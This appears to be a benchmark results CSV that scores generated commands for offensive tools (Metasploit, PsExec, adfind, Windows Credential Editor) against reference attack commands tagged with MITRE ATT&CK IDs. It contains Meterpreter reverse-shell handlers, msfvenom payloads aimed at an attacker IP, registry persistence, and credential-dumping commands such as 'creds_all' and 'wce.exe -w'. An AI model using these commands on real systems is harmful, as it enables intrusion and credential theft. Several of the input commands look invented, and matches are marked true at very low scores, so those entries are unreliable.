file,tool,input_command,matched_command,chrf_score,match_found
command_adfind_TA0007_T1087.txt,adfind,"adfind -f ""(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`",73.395,True
command_adfind_TA0007_T1087.txt,adfind,"adfind -b dc=joehome,dc=net -f ""objectcategory=person"" -showdel",`adfind.exe -f (objectcategory=person) > ad_users.txt`,43.321,True
command_adfind_TA0007_T1087.txt,adfind,"adfind -default -rb cn=users -f ""&(objectcategory=person)(samaccountname=*)""",`adfind.exe -f (objectcategory=person) > ad_users.txt`,43.28,True
command_adfind_TA0007_T1087.txt,adfind,"adfind -b dc=joehome,dc=net -f ""!(objectcategory=computer)""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,52.812,True
command_metasploit_TA0003_T1505.txt,metasploit,msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; run',"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",52.184,True
command_metasploit_TA0003_T1505.txt,metasploit,"msfconsole -x 'use exploit/windows/local/ meterpreter_persistence; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; set PersistenceRegKey ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run""; set PersistenceDLLName ""meterpreter.dll""; run'","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",26.229,True
command_metasploit_TA0004_T1068.txt,metasploit,msfconsole,`sudo msfconsole`,85.851,True
command_metasploit_TA0004_T1068.txt,metasploit,search privilege_escalation,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,14.193,True
command_metasploit_TA0004_T1068.txt,metasploit,use exploit/windows/local/...,"```
    use post/windows/gather/screen_spy
    set COUNT 60
    set DELAY 1
    set VIEW_SCREENSHOTS false
    set SESSION 3
    exploit
```",34.557,True
command_metasploit_TA0004_T1068.txt,metasploit,set RHOST <target_ip>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,14.399,True
command_metasploit_TA0004_T1068.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,56.249,True
command_metasploit_TA0004_T1068.txt,metasploit,exploit,"    ```
    set CMD ""reg.exe IMPORT C:\Users\Public\vnc-settings.reg""
    exploit
    ```",27.403,True
command_metasploit_TA0004_T1068.txt,metasploit,getsystem,`meterpreter> getsystem -t 1`,65.219,True
command_metasploit_TA0011_T1219.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,56.249,True
command_metasploit_TA0011_T1219.txt,metasploit,set RHOSTS 192.168.0.1-192.168.0.10,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",18.656,True
command_metasploit_TA0011_T1219.txt,metasploit,set RPORT 443,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,14.244,True
command_metasploit_TA0011_T1219.txt,metasploit,exploit -j -z -u -p <attacker_username> -P <attacker_password> -r <remote_host> -o,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,21.532,True
command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > shell,`meterpreter > load powershell`,70.528,True
command_metasploit_TA0011_T1219.txt,metasploit,shell -i -w <local_port> -e <remote_host> -p <remote_port>,`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,18.299,True
command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > change_wallpaper <background_image_path>,"```sh
meterpreter> load kiwi
meterpreter> creds_all
```",30.005,True
command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > play_sound <sound_file_path>,`meterpreter > powershell_execute Get-NetComputer`,32.34,True
command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > read_aloud <text_to_read>,"```sh
meterpreter> load kiwi
meterpreter> creds_all
```",36.186,True
command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > volume_control -m 50 -s off,`meterpreter > load powershell`,33.809,True
command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > exit,`meterpreter> getsystem -t 1`,62.702,True
command_psexec_TA0002_T1106.txt,psexec,"psexec \\remote_system -u domain\username -p password osql.exe -S <SQL_Server_Instance> -Q ""SELECT * FROM database.table""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",24.649,True
command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -K,"```sh
wce.exe -w
```",5.333,True
command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -k <kerberos_ticket_file>,"```sh
wce.exe -w
```",3.13,True
command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,"windows-credential-editor -g ""<password>""","```sh
wce.exe -w
```",3.854,True
command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -w,"```sh
wce.exe -w
```",6.028,True
command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -f,"```sh
wce.exe -w
```",5.333,True
